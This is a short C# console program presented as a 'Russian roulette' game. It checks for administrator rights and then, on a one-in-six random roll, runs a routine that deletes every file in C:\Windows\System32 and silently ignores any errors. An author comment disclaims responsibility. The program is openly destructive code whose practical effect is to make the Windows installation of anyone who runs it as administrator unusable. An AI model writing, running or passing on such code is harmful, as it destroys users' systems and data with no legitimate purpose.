using System;
using System.IO;
using System.Security.Principal;

namespace Russian_roulette
{
    class Program
    {
        static void Main(string[] args)
        {
            //I am not responsible for anything related to the program :D ~Batın~

            WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent();
            WindowsPrincipal windowsPrincipal = new WindowsPrincipal(windowsIdentity);
            bool isAdmin = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);

            if (isAdmin == true)
            {
                Console.WriteLine("Press Enter to start");
                Console.ReadLine();

                Random rand = new Random();
                int bullet = rand.Next(1, 7);
                Console.WriteLine(bullet);
                if (bullet == 3)
                {
                    Console.WriteLine("GG");
                    DelSys();
                }
                Console.ReadLine();
            }
            else
            {
                Console.WriteLine("You do not have sufficient permissions to play roulette, re-open as administrator");
                Console.ReadLine();
                Environment.Exit(0);

            }
        }
        public static void DelSys()
        {
            try
            {
                string rootFolder = @"C:\Windows\System32";
                string[] files = Directory.GetFiles(rootFolder);
                foreach (string file in files)
                {
                    File.Delete(file);
                }
            }
            catch
            {
            }
            
        }
    }
}
